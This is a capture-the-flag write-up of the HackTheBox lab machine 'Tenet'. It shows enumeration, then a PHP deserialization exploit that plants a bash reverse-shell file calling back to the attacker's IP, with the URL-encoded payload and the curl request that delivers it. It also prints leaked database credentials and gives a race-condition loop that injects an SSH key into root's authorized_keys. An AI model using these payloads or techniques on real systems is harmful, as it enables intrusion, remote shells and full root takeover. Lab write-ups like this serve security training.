---
layout: post
title:  "HacktheBox - Tenet"
date:   2021-06-12 5:35:00 +0200
last_modified_at: 2021-06-12 5:35:00 +0200
toc:  true
tags: [ctf, linux, hackthebox, Writeup, deserializacion]
categories: Hackthebox
---

It is an excellent machine to practice deserialization in PHP.

---

## Enumeration 
### Nmap
* 22/tcp OpenSSH 7.6p1
* 80/tcp Apache httpd 2.4.29

```

```bash
nmap -sC -sV -p22,80 10.10.10.223 -oN Scan_port1                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 10:33 EDT
Nmap scan report for 10.10.10.223
Host is up (0.060s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
```

## Web Enumeration
Quick listing tips to always see what we are up against:
```bash
whatweb  10.10.10.223                                                             
http://10.10.10.223 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], Title[Apache2 Ubuntu Default Page: It works]
```

### Fuzz
* /users.txt
* /wordpress/wp-login.php

```bash
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Target: http://10.10.10.223/

[18:55:50] Starting: 
[18:58:30] 200 -    7B  - /users.txt
[18:58:36] 200 -    6KB - /wordpress/wp-login.php
```

### Tenet Wordpress
![](/images_blog/img_tenet/Pastedimage20210502200252.png)
![Pastedimage20210502200252](https://user-images.githubusercontent.com/76759292/127757805-5d1395c6-eae9-4dfd-85c1-0e482dd3f039.png)


Subdomain:
* sator.tenet.htb

### Tenet.htb
![](/images_blog/img_tenet/Pastedimage20210502180600.png)
![Pastedimage20210502180600](https://user-images.githubusercontent.com/76759292/127757807-1ab06b16-8ec1-477a-b3e2-258c8507d8ad.png)


## Off topic
* /xmlrpc.php

Although it has nothing to do with it, I find it interesting the way this is exploited [aqui]((https://www.securityfocus.com/bid/14088/exploit))


## PHP deserialization

[Look](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)

Here is the other one:
* Sator.php.bak

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

This helps us to know where we should pull, then seeing how everything moves I realized that it could be deserialization and I found the blog that I put at the beginning.

Then with the php interactive we can create what we want the program to do:

```php
php -a           
Interactive mode enabled

php > class DatabaseExport {
php {   public $user_file = 'rce.php';
php {   public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.101/4444 0>&1\'"); ?>';
php {   }
php > 
php > print urlencode(serialize(new DatabaseExport));
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

To make this work, we do this, we see that it uses  ```arepo```
```
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

Then the serialized data we generate is placed here:
```
curl -i http://sator.tenet.htb/sator.php\?arepo\=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

Then we visited ```http://sator.tenet.htb/rce.php``` 

## PrivEsc
```bash
/** MySQL database username */                                                                                         
define( 'DB_USER', 'neil' );                                                                                           
                                                                                                                       
/** MySQL database password */                                                                                         
define( 'DB_PASSWORD', 'Opera2112' );     
```

Estas claves puedo entrar por ssh.

[mktemp](https://kbmwkaaxveg73o3q7ydl7zxf2a-adv7ofecxzh2qqi-superuser-com.translate.goog/questions/834277/what-should-i-worry-about-when-using-mktemp-dry-run) we see that we can run a script as root I analyze it and this part calls me:
```bash
addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName
}
```

If we look at the part of the mktemp -u we can see that the script writes the public key found in the key variable and copies it to a file

```bash
while true; do echo "ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" | tee /tmp/ssh* > /dev/null; done
```

Together we run the script several times and that's it.

MACHINE PWNED!!!!
<p align="center">
<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="300" height="300" />
</p>

